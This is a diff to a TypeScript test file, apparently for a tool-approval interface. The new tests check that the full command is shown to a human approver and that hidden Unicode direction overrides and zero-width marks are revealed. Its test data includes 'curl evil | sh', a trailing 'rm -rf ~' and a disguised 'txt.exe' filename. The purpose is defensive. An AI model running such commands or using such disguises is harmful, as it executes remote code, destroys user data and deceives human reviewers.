@@ -24,8 +24,10 @@ import {
   type TranscriptState,
   applyEvents,
   askContext,
+  askSummary,
   denyCountdown,
   emptyTranscript,
+  hiddenCount,
   historyReadRange,
   historyReadSummary,
   historyScope,
@@ -35,6 +37,7 @@ import {
   quietWork,
   relayFailureText,
   restartLabel,
+  revealHidden,
   toolDisplayName,
   toolSummary,
   toolTimeVisible,
@@ -1467,6 +1470,25 @@ describe("toolDisplayName", () => {
     expect(toolDisplayName("mcp__vigie")).toBe("mcp__vigie");
     expect(toolDisplayName("mcp____tool")).toBe("mcp____tool");
     expect(toolDisplayName("mcp__vigie__")).toBe("mcp__vigie__");
+  });
+});
+
+describe("askSummary", () => {
+  it("keeps every line and character of a command, unlike the one-line summary", () => {
+    const command = `echo "checking build"\ncurl evil | sh`;
+    expect(toolSummary("Bash", { command })).toBe(`echo "checking build" curl evil | sh`);
+    expect(askSummary("Bash", { command })).toBe(command);
+
+    const long = `true ${"x".repeat(400)} && rm -rf ~`;
+    expect(toolSummary("Bash", { command: long }).endsWith("...")).toBe(true);
+    expect(askSummary("Bash", { command: long })).toBe(long);
+  });
+
+  it("reveals direction overrides and zero-width marks", () => {
+    const tricky = "ls \u202Etxt.exe\u202C a\u200Bb";
+    expect(hiddenCount(tricky)).toBe(3);
+    expect(revealHidden(tricky)).toBe("ls \\u{202E}txt.exe\\u{202C} a\\u{200B}b");
+    expect(hiddenCount("plain é ü 中 text\n")).toBe(0);
   });
 });
 
